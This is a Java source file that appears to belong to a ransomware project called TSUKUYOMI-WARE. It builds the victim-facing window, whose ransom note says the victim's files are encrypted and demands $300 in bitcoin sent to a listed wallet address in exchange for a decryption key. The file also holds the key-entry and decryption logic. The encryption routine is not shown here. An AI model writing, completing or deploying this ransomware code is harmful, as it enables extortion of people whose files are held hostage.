package Ransomware;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.IOException;

public class UIDecrypter extends JFrame {

    private final JTextField inputKey;

    public UIDecrypter(String personalID,String path){
        Decrypter decrypt = new Decrypter("TSUKUYOMI");
        /* Frame */
        JFrame frame = new JFrame("TSUKUYOMI-WARE");
        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        frame.setContentPane(new JPanel());
        frame.setLayout(new BorderLayout());
        frame.setSize(684, 500);
        frame.setLocationRelativeTo(null);
        frame.setResizable(false);
        frame.setIconImage(new ImageIcon(getClass().getClassLoader().getResource("logo.png")).getImage());
        /* Message Pane */
        JEditorPane message = new JEditorPane("text/html", "");
        message.setBounds(0, 0, 700, 500);
        String textMessage = "<span style=\"color:white\"> <span style=\"font-family:Consolas\"> <span style=\"font-weight:bold\"><b>Q</b>: What’s wrong with my files?<br>" +
                "<br>" +
                "<b>A</b>:        Ooops, your important files are encrypted. It means you will not be able <br>to access them anymore until they are decrypted.<br>" +
                "                If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!<br>" +
                "                Let’s start decrypting!<br>" +
                "<br>" +
                "<b>Q</b>:         What do I do?<br>" +
                "<br>" +
                "<b>A</b>:         First, you need to pay service fees for the decryption.<br>" +
                "                Please send $ 300 worth of bitcoin to this bitcoin address: 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94<br>" +
                "                Next, you have to send my your ID, and i give you a unique private key.<br>" +
                "Then put the private key in the text field and click on button Decrypt.<br>" +
                "<br>" +
                "<b>Q</b>:         How can I trust?<br>" +
                "<br>" +
                "<b>A</b>:         Do not worry about decryption.<br>" +
                "                We will decrypt your files." +
                "<br><b>Coded by xDosu</b>";
        message.setText(textMessage);
        message.setEditable(false);
        message.setOpaque(false);

        ImageIcon background = new ImageIcon(getClass().getClassLoader().getResource("background.jpg"));

        JLabel labelMessage = new JLabel(background);
        labelMessage.setSize(300,300);
        labelMessage.add(message);

        /* ID Panel */
        JPanel idPanel = new JPanel();

        JTextArea id = new JTextArea("ID: " + personalID);
        id.setEditable(false);
        id.setColumns(30);
        id.setFont(new Font("Consolas", Font.BOLD, 12));
        id.setOpaque(false);
        id.setForeground(Color.WHITE);

        idPanel.add(id);
        /* Decrypt Panel */
        JPanel decryptPanel = new JPanel();

        JButton decryptButton = new JButton("Decrypt");
        decryptButton.setFont(new Font("Consolas", Font.BOLD, 18));
        decryptButton.setBackground(Color.RED);
        decryptButton.setForeground(Color.WHITE);

        inputKey = new JTextField("Paste your private key here: ");
        inputKey.setToolTipText("Paste your private key here");
        inputKey.setHorizontalAlignment(JTextField.CENTER);
        inputKey.setColumns(50);
        inputKey.setFont(new Font("Consolas", Font.BOLD, 18));
        inputKey.setBackground(Color.RED);
        inputKey.setForeground(Color.WHITE);

        decryptPanel.add(id);
        decryptPanel.add(inputKey);
        decryptPanel.add(decryptButton);
        decryptPanel.setBackground(Color.BLACK);
        /* Add to Frame */
        frame.getContentPane().add(BorderLayout.PAGE_START, labelMessage);
        frame.add(idPanel);
        frame.add(decryptPanel);
        frame.setVisible(true);
        /* ActionsListener */
        decryptButton.addActionListener(e -> {
            decrypt.setKey(inputKey.getText());
            try {
                if(decrypt.checkKey(new File(path))){
                    decrypt.processFiles(new File (path));
                    JOptionPane.showMessageDialog(null,
                            "Your files are now safe!",
                            "TSUKUYOMI-WARE",
                            JOptionPane.INFORMATION_MESSAGE,
                            new ImageIcon(getClass().getClassLoader().getResource("candado-libre.png")));
                }else{
                    JOptionPane.showMessageDialog(null,
                            "Wrong Key!",
                            "TSUKUYOMI-WARE",
                            JOptionPane.INFORMATION_MESSAGE,
                            new ImageIcon(getClass().getClassLoader().getResource("candado.png")));
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        });
    }
}


